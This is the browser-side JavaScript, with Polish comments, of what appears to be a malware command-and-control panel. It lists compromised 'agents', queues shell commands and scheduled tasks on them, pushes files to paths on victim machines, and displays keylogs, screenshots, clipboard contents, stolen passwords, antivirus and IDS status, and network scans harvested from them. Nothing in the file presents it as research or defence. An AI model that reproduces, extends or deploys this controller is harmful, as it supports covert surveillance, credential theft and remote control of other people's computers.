// Połączenie WebSocket
const socket = io('/updates');

// Funkcja pokazująca toast
function showToast(message) {
    const toastEl = document.getElementById('errorToast');
    const toastBody = document.getElementById('errorToastBody');
    if (toastEl && toastBody) {
        toastBody.textContent = message;
        const toast = new bootstrap.Toast(toastEl);
        toast.show();
    }
}

// Inicjalizacja wykresów
let agentsChart, errorsChart, keylogsChart, fileTransfersChart;
if (document.getElementById('agentsChart')) {
    agentsChart = new Chart(document.getElementById('agentsChart'), {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Agenci online',
                data: [],
                borderColor: '#00ddeb',
                fill: false
            }]
        },
        options: { responsive: true }
    });
}
if (document.getElementById('errorsChart')) {
    errorsChart = new Chart(document.getElementById('errorsChart'), {
        type: 'bar',
        data: {
            labels: [],
            datasets: [{
                label: 'Błędy na godzinę',
                data: [],
                backgroundColor: '#bb00ff'
            }]
        },
        options: { responsive: true }
    });
}
if (document.getElementById('keylogsChart')) {
    keylogsChart = new Chart(document.getElementById('keylogsChart'), {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Liczba keylogów',
                data: [],
                borderColor: '#00ddeb',
                fill: false
            }]
        },
        options: { responsive: true }
    });
}
if (document.getElementById('fileTransfersChart')) {
    fileTransfersChart = new Chart(document.getElementById('fileTransfersChart'), {
        type: 'bar',
        data: {
            labels: [],
            datasets: [{
                label: 'Transfery plików',
                data: [],
                backgroundColor: '#bb00ff'
            }]
        },
        options: { responsive: true }
    });
}

// Funkcja aktualizująca wybór agentów
function updateAgentDropdown(agents) {
    const containers = document.querySelectorAll('.agent-select-container');
    
    console.log('Aktualizacja wyboru agentów:', agents);

    containers.forEach(container => {
        const select = container.querySelector('.agent-select');
        const menu = container.querySelector('.agent-select-menu');
        const search = container.querySelector('.agent-select-search');
        const selectedAgentId = select.dataset.selectedAgentId || '';

        if (!select || !menu || !search) return;

        menu.innerHTML = '';
        Object.entries(agents).forEach(([agentId, agent]) => {
            const item = document.createElement('div');
            item.className = 'agent-select-item';
            item.dataset.agentId = agentId;
            item.innerHTML = `
                <span class="status-dot ${agent.status === 'online' ? 'online' : 'offline'}"></span>
                ${agentId} (${agent.hostname})
                <small class="text-muted">IP: ${agent.ip}</small>
            `;
            item.addEventListener('click', () => {
                select.dataset.selectedAgentId = agentId;
                select.querySelector('.agent-select-text').textContent = `${agentId} (${agent.hostname})`;
                menu.classList.remove('show');
                console.log('Wybrano agenta:', agentId);
            });
            menu.appendChild(item);
        });

        search.addEventListener('input', () => {
            const query = search.value.toLowerCase();
            menu.querySelectorAll('.agent-select-item').forEach(item => {
                const text = item.textContent.toLowerCase();
                item.style.display = text.includes(query) ? '' : 'none';
            });
        });

        select.addEventListener('click', () => {
            menu.classList.toggle('show');
        });

        document.addEventListener('click', (e) => {
            if (!container.contains(e.target)) {
                menu.classList.remove('show');
            }
        });

        if (selectedAgentId && agents[selectedAgentId]) {
            select.querySelector('.agent-select-text').textContent = `${selectedAgentId} (${agents[selectedAgentId].hostname})`;
        } else {
            select.querySelector('.agent-select-text').textContent = 'Wybierz agenta';
        }
    });

    updateAgentsTable(agents);
}

// Funkcja aktualizująca tabelę agentów
function updateAgentsTable(agents) {
    const tbody = document.getElementById('agentsTable');
    if (tbody) {
        tbody.innerHTML = '';
        Object.values(agents).forEach(agent => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${agent.id}</td>
                <td>${agent.hostname}</td>
                <td>${agent.ip}</td>
                <td><span class="status-dot ${agent.status === 'online' ? 'online' : 'offline'}"></span> ${agent.status}</td>
                <td>${new Date(agent.last_seen * 1000).toLocaleString()}</td>
                <td>
                    <button class="btn btn-sm btn-primary" onclick="sendCommand('${agent.id}')">Wyślij komendę</button>
                </td>
            `;
            tbody.appendChild(row);
        });
    }
}

// Funkcja wysyłania komendy
function sendCommand(agentId) {
    const containers = document.querySelectorAll('.agent-select-container');
    let selectedAgentId = agentId;
    if (!selectedAgentId) {
        const select = document.querySelector('.agent-select');
        selectedAgentId = select ? select.dataset.selectedAgentId : '';
    }
    const commandInput = document.getElementById('commandInput');
    const command = commandInput ? commandInput.value : '';

    if (!selectedAgentId || !command) {
        showToast('Wybierz agenta i wpisz komendę');
        return;
    }

    fetch('/api/send_command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ agent_ids: [selectedAgentId], command })
    })
    .then(response => response.json())
    .then(data => {
        showToast(data.status === 'command_queued' ? 'Komenda w kolejce' : data.message);
    })
    .catch(err => showToast('Błąd: ' + err.message));
}

// Funkcja planowania zadania
function scheduleTask() {
    const select = document.querySelector('.agent-select');
    const agentId = select ? select.dataset.selectedAgentId : '';
    const command = document.getElementById('commandInput').value;
    const scheduleTime = document.getElementById('scheduleTime').value;

    if (!agentId || !command || !scheduleTime) {
        showToast('Wybierz agenta, wpisz komendę i czas');
        return;
    }

    fetch('/api/schedule_task', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            agent_id: agentId,
            command,
            schedule_time: new Date(scheduleTime).toISOString().slice(0, 19).replace('T', ' ')
        })
    })
    .then(response => response.json())
    .then(data => {
        showToast(data.status === 'task_scheduled' ? 'Zadanie zaplanowane' : data.message);
    })
    .catch(err => showToast('Błąd: ' + err.message));
}

// Funkcja zarządzania grupami
function manageGroup() {
    const groupId = document.getElementById('groupId').value;
    const select = document.querySelector('.agent-select');
    const agentIds = select ? [select.dataset.selectedAgentId] : [];

    if (!groupId || !agentIds.length) {
        showToast('Wpisz ID grupy i wybierz agenta');
        return;
    }

    fetch('/api/manage_groups', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ group_id: groupId, agent_ids: agentIds })
    })
    .then(response => response.json())
    .then(data => {
        showToast(data.status === 'success' ? 'Grupa zaktualizowana' : data.message);
    })
    .catch(err => showToast('Błąd: ' + err.message));
}

// Funkcja generowania raportu
function generateReport() {
    const select = document.querySelector('.agent-select');
    const agentId = select ? select.dataset.selectedAgentId : '';

    if (!agentId) {
        showToast('Wybierz agenta');
        return;
    }

    fetch('/api/generate_report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ agent_id: agentId })
    })
    .then(response => {
        if (!response.ok) throw new Error('Błąd generowania raportu');
        return response.blob();
    })
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `report_${agentId}.pdf`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        showToast('Raport wygenerowany');
    })
    .catch(err => showToast('Błąd: ' + err.message));
}

// Drag & Drop dla przesyłania plików
let selectedFiles = [];

function setupDragAndDrop() {
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');

    if (dropZone && fileInput) {
        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropZone.classList.add('dragover');
        });

        dropZone.addEventListener('dragleave', () => {
            dropZone.classList.remove('dragover');
        });

        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            dropZone.classList.remove('dragover');
            selectedFiles = Array.from(e.dataTransfer.files);
            updateFileList();
        });

        dropZone.addEventListener('click', () => {
            fileInput.click();
        });

        fileInput.addEventListener('change', () => {
            selectedFiles = Array.from(fileInput.files);
            updateFileList();
        });
    }
}

function updateFileList() {
    const dropZone = document.getElementById('dropZone');
    if (dropZone) {
        if (selectedFiles.length > 0) {
            dropZone.innerHTML = `<p>Wybrane pliki: ${selectedFiles.map(f => f.name).join(', ')}</p>`;
        } else {
            dropZone.innerHTML = '<p class="text-center">Przeciągnij i upuść pliki tutaj lub kliknij, aby wybrać</p>';
        }
    }
}

function uploadFiles() {
    const select = document.querySelector('.agent-select');
    const agentId = select ? select.dataset.selectedAgentId : '';
    const targetPath = document.getElementById('targetPath').value;

    if (!agentId || !targetPath || selectedFiles.length === 0) {
        showToast('Wybierz agenta, ścieżkę docelową i pliki');
        return;
    }

    selectedFiles.forEach(file => {
        const formData = new FormData();
        formData.append('file', file);
        formData.append('agent_id', agentId);
        formData.append('target_path', targetPath);

        fetch('/api/upload_file_from_browser', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            showToast(data.status === 'success' ? `Plik ${file.name} w kolejce` : data.message);
        })
        .catch(err => showToast('Błąd: ' + err.message));
    });

    selectedFiles = [];
    updateFileList();
}

// Funkcja usuwania grupy
function deleteGroup(groupId) {
    fetch('/api/manage_groups', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ group_id: groupId, agent_ids: [] })
    })
    .then(response => response.json())
    .then(data => {
        showToast(data.status === 'success' ? 'Grupa usunięta' : data.message);
    })
    .catch(err => showToast('Błąd: ' + err.message));
}

// Obsługa WebSocket
socket.on('connect', () => {
    console.log('Połączono z WebSocket');
});

socket.on('disconnect', () => {
    console.log('Rozłączono z WebSocket');
});

socket.on('agents_update', (agents) => {
    console.log('Otrzymano aktualizację agentów:', agents);
    updateAgentDropdown(agents);
    if (agentsChart) {
        const labels = new Array(10).fill('').map((_, i) => new Date(Date.now() - (9 - i) * 1000).toLocaleTimeString());
        const data = new Array(10).fill(Object.values(agents).filter(a => a.status === 'online').length);
        agentsChart.data.labels = labels;
        agentsChart.data.datasets[0].data = data;
        agentsChart.update();
    }
});

socket.on('metrics_update', (metrics) => {
    console.log('Otrzymano metryki:', metrics);
    if (document.getElementById('agents-online')) {
        document.getElementById('agents-online').textContent = metrics.agents_online;
        document.getElementById('errors-last-hour').textContent = metrics.errors_last_hour;
        document.getElementById('commands-sent').textContent = metrics.commands_sent;
        document.getElementById('queue-size').textContent = metrics.queue_size;
    }
    if (errorsChart) {
        const labels = new Array(10).fill('').map((_, i) => new Date(Date.now() - (9 - i) * 3600000).toLocaleTimeString());
        const data = new Array(10).fill(metrics.errors_last_hour);
        errorsChart.data.labels = labels;
        errorsChart.data.datasets[0].data = data;
        errorsChart.update();
    }
});

socket.on('errors_update', (errors) => {
    console.log('Otrzymano błędy:', errors);
    const tbody = document.getElementById('errorsTable');
    if (tbody) {
        tbody.innerHTML = '';
        errors.forEach(error => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${new Date(error.timestamp * 1000).toLocaleString()}</td>
                <td>${error.message}</td>
            `;
            tbody.appendChild(row);
        });
    }
    const errorsBody = document.getElementById('recentErrorsTable');
    if (errorsBody) {
        errorsBody.innerHTML = '';
        errors.slice(-5).forEach(error => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${new Date(error.timestamp * 1000).toLocaleString()}</td>
                <td>${error.message}</td>
            `;
            errorsBody.appendChild(row);
        });
    }
    errors.forEach(error => showToast(error.message));
});

socket.on('results_update', (results) => {
    console.log('Otrzymano wyniki:', results);
    const tbody = document.getElementById('resultsTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (results[agentId]) {
            tbody.innerHTML = '';
            results[agentId].forEach(result => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(result.timestamp * 1000).toLocaleString()}</td>
                    <td>${result.command}</td>
                    <td>${result.result}</td>
                    <td>${result.is_error ? 'Tak' : 'Nie'}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
    const resultsBody = document.getElementById('recentResultsTable');
    if (resultsBody) {
        Object.values(results).flat().slice(-5).forEach(result => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${new Date(result.timestamp * 1000).toLocaleString()}</td>
                <td>${result.command}</td>
                <td>${result.result}</td>
            `;
            resultsBody.appendChild(row);
        });
    }
});

socket.on('keylogs_update', (keylogs) => {
    console.log('Otrzymano keylogi:', keylogs);
    const tbody = document.getElementById('keylogsTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (keylogs[agentId]) {
            tbody.innerHTML = '';
            keylogs[agentId].forEach(keylog => {
                keylog.data.forEach(data => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${new Date(keylog.timestamp * 1000).toLocaleString()}</td>
                        <td>${data.context}</td>
                        <td>${data.key}</td>
                    `;
                    tbody.appendChild(row);
                });
            });
        }
    }
    if (keylogsChart) {
        const labels = new Array(10).fill('').map((_, i) => new Date(Date.now() - (9 - i) * 1000).toLocaleTimeString());
        const data = Object.values(keylogs).map(agentKeylogs => agentKeylogs.length);
        keylogsChart.data.labels = labels;
        keylogsChart.data.datasets[0].data = data;
        keylogsChart.update();
    }
    const keylogsBody = document.getElementById('recentKeylogsTable');
    if (keylogsBody) {
        Object.values(keylogs).flat().slice(-5).forEach(keylog => {
            keylog.data.forEach(data => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(keylog.timestamp * 1000).toLocaleString()}</td>
                    <td>${data.context}</td>
                    <td>${data.key}</td>
                `;
                keylogsBody.appendChild(row);
            });
        });
    }
});

socket.on('file_transfers_update', (transfers) => {
    console.log('Otrzymano transfery plików:', transfers);
    const tbody = document.getElementById('fileTransfersTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (transfers[agentId]) {
            tbody.innerHTML = '';
            transfers[agentId].forEach(transfer => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(transfer.timestamp * 1000).toLocaleString()}</td>
                    <td>${transfer.type}</td>
                    <td>${transfer.filename}</td>
                    <td>${transfer.target_path || 'N/A'}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
    if (fileTransfersChart) {
        const labels = new Array(10).fill('').map((_, i) => new Date(Date.now() - (9 - i) * 3600000).toLocaleTimeString());
        const data = Object.values(transfers).map(agentTransfers => agentTransfers.length);
        fileTransfersChart.data.labels = labels;
        fileTransfersChart.data.datasets[0].data = data;
        fileTransfersChart.update();
    }
    const transfersBody = document.getElementById('recentFileTransfersTable');
    if (transfersBody) {
        Object.values(transfers).flat().slice(-5).forEach(transfer => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${new Date(transfer.timestamp * 1000).toLocaleString()}</td>
                <td>${transfer.type}</td>
                <td>${transfer.filename}</td>
            `;
            transfersBody.appendChild(row);
        });
    }
});

socket.on('screenshots_update', (screenshots) => {
    console.log('Otrzymano zrzuty ekranu:', screenshots);
    const gallery = document.getElementById('screenshotsGallery');
    if (gallery) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (screenshots[agentId]) {
            gallery.innerHTML = '';
            screenshots[agentId].forEach(screenshot => {
                const col = document.createElement('div');
                col.className = 'col-md-4 mb-3';
                col.innerHTML = `
                    <div class="card">
                        <img src="${screenshot.data}" class="card-img-top" alt="Zrzut ekranu">
                        <div class="card-body">
                            <p class="card-text">${new Date(screenshot.timestamp * 1000).toLocaleString()}</p>
                        </div>
                    </div>
                `;
                gallery.appendChild(col);
            });
        }
    }
});

socket.on('system_info_update', (systemInfo) => {
    console.log('Otrzymano informacje systemowe:', systemInfo);
    const container = document.getElementById('systemInfo');
    if (container) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (systemInfo[agentId]) {
            container.innerHTML = '<div class="card-body"></div>';
            const body = container.querySelector('.card-body');
            systemInfo[agentId].forEach(info => {
                const pre = document.createElement('pre');
                pre.textContent = JSON.stringify(info.data, null, 2);
                body.appendChild(pre);
            });
        }
    }
});

socket.on('system_changes_update', (changes) => {
    console.log('Otrzymano zmiany systemowe:', changes);
    const tbody = document.getElementById('systemChangesTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (changes[agentId]) {
            tbody.innerHTML = '';
            changes[agentId].forEach(change => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(change.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(change.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('clipboard_update', (clipboard) => {
    console.log('Otrzymano dane schowka:', clipboard);
    const tbody = document.getElementById('clipboardTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (clipboard[agentId]) {
            tbody.innerHTML = '';
            clipboard[agentId].forEach(item => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(item.timestamp * 1000).toLocaleString()}</td>
                    <td>${item.content}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('network_scan_update', (scans) => {
    console.log('Otrzymano wyniki skanu sieci:', scans);
    const tbody = document.getElementById('networkScanTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (scans[agentId]) {
            tbody.innerHTML = '';
            scans[agentId].forEach(scan => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(scan.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(scan.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('permissions_update', (permissions) => {
    console.log('Otrzymano dane uprawnień:', permissions);
    const tbody = document.getElementById('permissionsTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (permissions[agentId]) {
            tbody.innerHTML = '';
            permissions[agentId].forEach(perm => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(perm.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(perm.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('antivirus_update', (antivirus) => {
    console.log('Otrzymano dane antywirusa:', antivirus);
    const tbody = document.getElementById('antivirusTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (antivirus[agentId]) {
            tbody.innerHTML = '';
            antivirus[agentId].forEach(av => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(av.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(av.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('passwords_update', (passwords) => {
    console.log('Otrzymano hasła:', passwords);
    const tbody = document.getElementById('passwordsTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (passwords[agentId]) {
            tbody.innerHTML = '';
            passwords[agentId].forEach(pwd => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(pwd.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(pwd.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('ids_update', (ids) => {
    console.log('Otrzymano dane IDS/IPS:', ids);
    const tbody = document.getElementById('idsTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (ids[agentId]) {
            tbody.innerHTML = '';
            ids[agentId].forEach(id => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(id.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(id.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('agent_stats_update', (stats) => {
    console.log('Otrzymano statystyki agenta:', stats);
    const tbody = document.getElementById('agentStatsTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (stats[agentId]) {
            tbody.innerHTML = '';
            stats[agentId].forEach(stat => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(stat.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(stat.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('system_events_update', (events) => {
    console.log('Otrzymano zdarzenia systemowe:', events);
    const tbody = document.getElementById('systemEventsTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (events[agentId]) {
            tbody.innerHTML = '';
            events[agentId].forEach(event => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${new Date(event.timestamp * 1000).toLocaleString()}</td>
                    <td>${JSON.stringify(event.data)}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('tasks_update', (tasks) => {
    console.log('Otrzymano zadania:', tasks);
    const tbody = document.getElementById('tasksTable');
    if (tbody) {
        const select = document.querySelector('.agent-select');
        const agentId = select ? select.dataset.selectedAgentId : '';
        if (tasks[agentId]) {
            tbody.innerHTML = '';
            tasks[agentId].forEach(task => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${task.scheduled_time}</td>
                    <td>${task.command}</td>
                    <td>${task.executed ? 'Tak' : 'Nie'}</td>
                `;
                tbody.appendChild(row);
            });
        }
    }
});

socket.on('groups_update', (groups) => {
    console.log('Otrzymano grupy:', groups);
    const tbody = document.getElementById('groupsTable');
    if (tbody) {
        tbody.innerHTML = '';
        Object.entries(groups).forEach(([groupId, agentIds]) => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${groupId}</td>
                <td>${agentIds.join(', ')}</td>
                <td>
                    <button class="btn btn-sm btn-danger" onclick="deleteGroup('${groupId}')">Usuń</button>
                </td>
            `;
            tbody.appendChild(row);
        });
    }
});

socket.on('chat_messages_update', (messages) => {
    console.log('Otrzymano wiadomości czatu:', messages);
});

// Przełączanie motywu i inicjalne ładowanie danych
document.addEventListener('DOMContentLoaded', () => {
    const savedTheme = localStorage.getItem('theme') || 'dark';
    document.documentElement.setAttribute('data-theme', savedTheme);

    const themeToggle = document.getElementById('themeToggle');
    if (themeToggle) {
        themeToggle.addEventListener('click', () => {
            const currentTheme = document.documentElement.getAttribute('data-theme') || 'dark';
            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
            document.documentElement.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
        });
    }

    setupDragAndDrop();

    fetch('/api/agents')
        .then(response => response.json())
        .then(agents => {
            console.log('Pobrano agentów przez HTTP:', agents);
            updateAgentDropdown(agents);
        })
        .catch(err => {
            console.error('Błąd pobierania agentów:', err);
            showToast('Błąd pobierania agentów: ' + err.message);
        });

    fetch('/api/metrics')
        .then(response => response.json())
        .then(metrics => {
            console.log('Pobrano metryki przez HTTP:', metrics);
            if (document.getElementById('agents-online')) {
                document.getElementById('agents-online').textContent = metrics.agents_online;
                document.getElementById('errors-last-hour').textContent = metrics.errors_last_hour;
                document.getElementById('commands-sent').textContent = metrics.commands_sent;
                document.getElementById('queue-size').textContent = metrics.queue_size;
            }
        })
        .catch(err => console.error('Błąd pobierania metryk:', err));

    fetch('/api/get_errors')
        .then(response => response.json())
        .then(data => {
            console.log('Pobrano błędy przez HTTP:', data);
            const tbody = document.getElementById('errorsTable');
            if (tbody) {
                tbody.innerHTML = '';
                data.errors.forEach(error => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${new Date(error.timestamp * 1000).toLocaleString()}</td>
                        <td>${error.message}</td>
                    `;
                    tbody.appendChild(row);
                });
            }
            const errorsBody = document.getElementById('recentErrorsTable');
            if (errorsBody) {
                data.errors.slice(-5).forEach(error => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${new Date(error.timestamp * 1000).toLocaleString()}</td>
                        <td>${error.message}</td>
                    `;
                    errorsBody.appendChild(row);
                });
            }
        })
        .catch(err => console.error('Błąd pobierania błędów:', err));

    fetch('/api/get_all_sent_commands')
        .then(response => response.json())
        .then(data => {
            console.log('Pobrano komendy przez HTTP:', data);
            const resultsBody = document.getElementById('recentResultsTable');
            if (resultsBody) {
                resultsBody.innerHTML = '';
                Object.values(data.commands).flat().slice(-5).forEach(command => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${new Date(command.timestamp * 1000).toLocaleString()}</td>
                        <td>${command.command}</td>
                        <td>N/A</td>
                    `;
                    resultsBody.appendChild(row);
                });
            }
        })
        .catch(err => console.error('Błąd pobierania komend:', err));

    fetch('/api/get_keylog')
        .then(response => response.json())
        .then(data => {
            console.log('Pobrano keylogi przez HTTP:', data);
            const keylogsBody = document.getElementById('recentKeylogsTable');
            if (keylogsBody) {
                keylogsBody.innerHTML = '';
                data.keylogs.slice(-5).forEach(keylog => {
                    keylog.data.forEach(data => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${new Date(keylog.timestamp * 1000).toLocaleString()}</td>
                            <td>${data.context}</td>
                            <td>${data.key}</td>
                        `;
                        keylogsBody.appendChild(row);
                    });
                });
            }
        })
        .catch(err => console.error('Błąd pobierania keylogów:', err));

    fetch('/api/get_file_transfers')
        .then(response => response.json())
        .then(data => {
            console.log('Pobrano transfery plików przez HTTP:', data);
            const transfersBody = document.getElementById('recentFileTransfersTable');
            if (transfersBody) {
                transfersBody.innerHTML = '';
                data.transfers.slice(-5).forEach(transfer => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${new Date(transfer.timestamp * 1000).toLocaleString()}</td>
                        <td>${transfer.type}</td>
                        <td>${transfer.filename}</td>
                    `;
                    transfersBody.appendChild(row);
                });
            }
        })
        .catch(err => console.error('Błąd pobierania transferów:', err));
});